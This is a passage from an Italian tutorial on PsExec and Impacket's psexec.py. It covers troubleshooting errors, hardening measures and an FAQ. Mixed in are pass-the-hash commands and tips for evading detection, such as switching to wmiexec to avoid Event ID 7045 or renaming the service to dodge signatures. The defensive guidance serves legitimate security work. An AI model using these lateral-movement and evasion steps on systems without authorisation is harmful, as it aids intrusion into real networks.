Oltre ai permessi, spesso è un antivirus o un EDR che blocca la creazione del servizio o la scrittura su `ADMIN$`. Controlla gli avvisi del prodotto di sicurezza sul target, e verifica che `ADMIN$` sia scrivibile.

**"The network path was not found"**
Target spento, firewall che blocca la 445, oppure il nome host non si risolve. Prova `ping`, poi `nmap -p445 target`, poi usa direttamente l'IP.

**"The specified service already exists"**
Un'esecuzione precedente non ha ripulito. Controlla con `sc query PSEXESVC` e rimuovi con `sc delete PSEXESVC` prima di riprovare.

**"The handle is invalid"**
Spesso un problema di UAC o di versione di Windows. Prova con `-h` (token elevato) oppure passa a `psexec.py` di Impacket.

**Il servizio non parte**
Se il file `PSEXESVC.exe` viene messo in quarantena dall'antivirus subito dopo la copia, il servizio non si avvia. Guarda i log del prodotto di sicurezza, poi `sc query PSEXESVC`.

**Impacket "STATUS\_LOGON\_FAILURE"**
Hash o password non validi su quel target, oppure account bloccato. Valida prima con `nxc smb target -u utente -H hash`, così non rischi di bloccare un account con tentativi ripetuti.

## Come difendersi da PsExec

* Non riusare la stessa password dell'amministratore locale su più macchine: è la condizione che rende possibile ogni catena di movimento laterale vista sopra. Usa LAPS per avere password uniche per ogni computer
* Lascia `LocalAccountTokenFilterPolicy` a 0 (il valore di default): il filtro UAC remoto sugli account locali ferma molti tentativi con credenziali locali riutilizzate
* Monitora l'Event ID 7045 (e il 4697) su tutti gli endpoint, con allarme sui servizi creati da accessi di rete e sui binari scritti in `C:\Windows` da `ADMIN$`
* Limita il traffico SMB tra workstation: le workstation devono parlare solo con i server autorizzati, così un host compromesso non si propaga a raggiera
* Applica il privilegio minimo: se un account non deve essere Domain Admin, non deve esserlo. Riduce molto la superficie di pass the hash
* Attiva SMB signing obbligatorio: non blocca PsExec con credenziali valide, ma chiude la strada al relay NTLM verso SMB
* Metti in blocklist o in allowlist controllata `PsExec.exe` con l'EDR o con AppLocker, e consenti l'uso solo dalle postazioni degli amministratori

## FAQ

**PsExec è un virus?**
No. È un tool Microsoft firmato. Molti antivirus lo segnalano come "remote admin" perché è stato usato spesso da malware e ransomware. Scaricalo sempre dalla pagina ufficiale Sysinternals.

**Dove si scarica PsExec e come si installa?**
Dalla pagina ufficiale Microsoft: scarichi `PSTools.zip`, estrai `PsExec.exe` (o `PsExec64.exe`) e lo copi in una cartella del `PATH`. Non c'è installer. Alla prima esecuzione serve accettare l'EULA, oppure usare `-accepteula`.

**PsExec richiede sempre la password in chiaro?**
Sysinternals PsExec sì. `psexec.py` di Impacket supporta il pass the hash con `-hashes :NTHASH` e Kerberos con `-k`.

**Qual è la differenza tra PsExec e psexec.py?**
PsExec è un binario Windows firmato Microsoft, vuole la password e copia `PSEXESVC.exe`. `psexec.py` è uno script Python che gira anche da Linux, supporta pass the hash e usa il binario RemCom con nomi casuali per servizio e file.

**PsExec funziona con SMB signing attivo?**
Sì. L'SMB signing impedisce gli attacchi di relay, non l'autenticazione legittima: con credenziali valide PsExec funziona anche con signing obbligatorio.

**PsExec richiede un Domain Admin?**
No, basta essere amministratore locale sul target. Un Domain Admin lo è automaticamente su ogni macchina del dominio, ma per una singola workstation è sufficiente l'amministratore locale di quella macchina.

**Come posso evitare l'Event ID 7045?**
Con PsExec non puoi: la creazione del servizio è il suo meccanismo. Se non vuoi creare servizi usa `wmiexec` o Evil-WinRM. Un nome di servizio custom con `-r` riduce il match sulle firme note, ma l'evento resta registrato.

**PsExec lascia tracce permanenti?**
Il binario `PSEXESVC.exe` viene rimosso a fine esecuzione, ma restano il file Prefetch (`PSEXESVC.exe-*.pf` in `C:\Windows\Prefetch`) e gli eventi nei log (7045, 4624, 5145) fino alla rotazione.

**Quali sono le alternative a PsExec?**
`wmiexec` per la massima discrezione, Evil-WinRM per una shell interattiva con trasferimento file, `smbexec` come compromesso. Sul lato amministrativo, PowerShell Remoting e Invoke-Command sono le alternative native.

**Come si rileva PsExec nella mia rete?**
Cerca l'Event ID 7045 con servizio `PSEXESVC` o con nomi di servizio sospetti creati da accessi di rete, la pipe `PSEXESVC` in Sysmon e le scritture su `ADMIN$`. Poi riduci la superficie: LAPS, SMB limitato tra workstation e `PsExec.exe` consentito solo agli amministratori.
